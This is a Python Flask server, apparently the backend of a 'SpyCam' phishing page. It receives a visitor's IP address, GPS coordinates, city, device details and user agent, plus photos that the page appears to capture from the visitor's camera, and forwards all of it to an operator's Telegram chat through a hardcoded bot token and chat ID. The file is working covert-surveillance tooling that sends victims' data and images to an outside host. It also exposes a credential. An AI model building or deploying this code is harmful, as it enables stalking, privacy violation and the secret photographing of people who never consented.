from flask import Flask, request, render_template, redirect
import requests
import os

app = Flask(__name__)
BOT_TOKEN = '7590817261:AAGL6vH2hi4NPd9x1Iikaqlk40p5xxQ0cBc'
CHAT_ID = '6908281054'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    message = f"""🕵️‍♂️ Faizan™ SpyCam Alert
📌 IP: {ip}
📍 Location: {data.get('latitude')}, {data.get('longitude')}
🌆 City: {data.get('city')}, 🌍 Country: {data.get('country')}
🕐 Timezone: {data.get('timezone')}
🗺️ Map: {data.get('mapsLink')}
📷 Camera: {data.get('camera')}
🧠 Device: {data.get('deviceName')}
🌐 UserAgent: {data.get('userAgent')}"""

    send_telegram(message)
    return 'ok'

@app.route('/photo', methods=['POST'])
def photo():
    if 'photo' in request.files:
        photo = request.files['photo']
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': (photo.filename, photo.stream, photo.mimetype)}
        data = {'chat_id': CHAT_ID}
        requests.post(url, data=data, files=files)
    return 'photo sent'

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': msg}
    requests.post(url, data=payload)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
